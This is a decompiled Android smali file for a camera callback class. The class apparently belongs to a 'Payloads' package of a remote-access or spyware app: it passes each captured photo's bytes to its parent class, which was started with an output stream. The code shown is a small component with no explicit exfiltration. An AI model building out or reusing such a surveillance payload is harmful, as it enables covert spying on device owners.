.class Lcom/android/ld/Payloads/CameraManager$1;
.super Ljava/lang/Object;
.source "CameraManager.java"

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/ld/Payloads/CameraManager;->startUp(ILjava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/ld/Payloads/CameraManager;


# direct methods
.method constructor <init>(Lcom/android/ld/Payloads/CameraManager;)V
    .locals 0
    .param p1, "this$0"    # Lcom/android/ld/Payloads/CameraManager;

    .line 67
    iput-object p1, p0, Lcom/android/ld/Payloads/CameraManager$1;->this$0:Lcom/android/ld/Payloads/CameraManager;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 1
    .param p1, "data"    # [B
    .param p2, "camera"    # Landroid/hardware/Camera;

    .line 70
    iget-object v0, p0, Lcom/android/ld/Payloads/CameraManager$1;->this$0:Lcom/android/ld/Payloads/CameraManager;

    invoke-static {v0}, Lcom/android/ld/Payloads/CameraManager;->access$000(Lcom/android/ld/Payloads/CameraManager;)V

    .line 71
    iget-object v0, p0, Lcom/android/ld/Payloads/CameraManager$1;->this$0:Lcom/android/ld/Payloads/CameraManager;

    invoke-static {v0, p1}, Lcom/android/ld/Payloads/CameraManager;->access$100(Lcom/android/ld/Payloads/CameraManager;[B)V

    .line 72
    return-void
.end method
